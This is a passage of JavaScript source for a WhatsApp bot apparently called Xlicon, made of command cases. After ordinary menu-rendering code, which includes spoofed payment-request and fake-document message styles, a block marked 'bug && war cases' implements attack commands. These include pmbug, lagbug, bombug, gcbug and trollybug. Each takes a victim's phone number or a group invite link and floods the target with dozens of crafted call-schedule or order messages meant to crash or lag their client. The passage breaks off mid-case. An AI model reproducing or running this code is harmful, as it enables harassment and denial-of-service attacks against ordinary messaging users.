      case "animemenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${animemenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "stickermenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stickermenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "databasemenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${databasemenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "aimenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${aimenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "bugmenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${bugmenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "checkaccount":
      case "account":
        {
          let a = db.data.users[sender];
          let b = `Below is your account information\n`;
          b += `================================\n`;
          b += `Serial Code:\n*[${a.serialNumber}]*\n`;
          b += `Title: ${a.title}\n`;
          b += `Afk Time: ${a.afkTime}\n`;
          b += `Afk Reason: ${a.afkReason}\n`;
          b += `Nickname: ${a.nick}\n`;
          b += `Premium Status: ${a.premium}\n`;
          b += `Your Limit: ${a.limit}\n`;
          b += `================================`;
          XliconBotInc.sendMessage(sender, { text: b }, { quoted: m });
          replygcXlicon("Account Details Has Been Sent In Private Chat");
        }
        break;
      case "limit":
      case "checklimit":
        {
          let a = db.data.users[sender];
          let b = `Your Limit ${a.limit}\n`;
          b += `Premium Status ${isPrem ? "On" : "Off"}\n`;
          b += `Serial Code:\n*[${a.serialNumber}]*\n`;
          replygcXlicon(b);
        }
        break;

      //bug && war cases
      //⚠️do not edit cases otherwise bug not work
      //bug cases
      case "amountbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return relygcxeon(
              `Use ${prefix + command} amount\nExample ${prefix + command} 5`
            );
          amount = `${encodeURI(text)}`;
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              from,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcXlicon(
          `*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`
        );
        break;
      case "pmbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcXlicon(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "delaybug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcXlicon(
          `*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "docubug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          if (args.length < 1)
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "15";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcXlicon(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "unlimitedbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext3;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcXlicon(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "bombug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext4;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcXlicon(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "lagbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcXlicon(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "trollybug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "15";
          for (let i = 0; i < amount; i++) {
            var order = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                orderMessage: {
                  orderId: "599519108102353",
                  thumbnail: thumb,
                  itemCount: 1999,
                  status: "INQUIRY",
                  surface: "CATALOG",
                  message: `${botname}`,
                  orderTitle: " TROLLY BUG ",
                  sellerJid: "916909137213@s.whatsapp.net",
                  token: "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(victim, order.message, {
              messageId: order.key.id,
            });
          }
          replygcXlicon(
            `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
          );
        }
        break;
      case "gcbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let xeongc = await XliconBotInc.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              xeongc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcXlicon(
            `*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`
          );
        }
        break;
      case "delaygcbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let xeongc = await XliconBotInc.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext5;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              xeongc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcXlicon(
            `*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`
          );
        }
        break;
      case "laggcbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let xeongc = await XliconBotInc.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              xeongc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcXlicon(
            `*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`
          );
        }
        break;
      case "bomgcbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let xeongc = await haikal.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext4;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              xeongc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcXlicon(
            `*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`
          );
        }
        break;
      case "unlimitedgcbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let xeongc = await XliconBotInc.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext3;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Karachi")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            XliconBotInc.relayMessage(
              xeongc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcXlicon(
            `*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`
          );
        }
        break;
      case "trollygcbug":
        {
          if (!isPremium) return replygcXlicon(mess.premium);
          if (!args[0])
            return replygcXlicon(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let xeongc = await XliconBotInc.groupAcceptInvite(result);
          amount = "15";
          for (let i = 0; i < amount; i++) {
            var order = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                orderMessage: {
                  orderId: "599519108102353",
                  thumbnail: thumb,
                  itemCount: 1999,
                  status: "INQUIRY",
                  surface: "CATALOG",
                  message: `${botname}`,
                  orderTitle: " TROLLY BUG ",
                  sellerJid: "916909137213@s.whatsapp.net",
                  token: "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
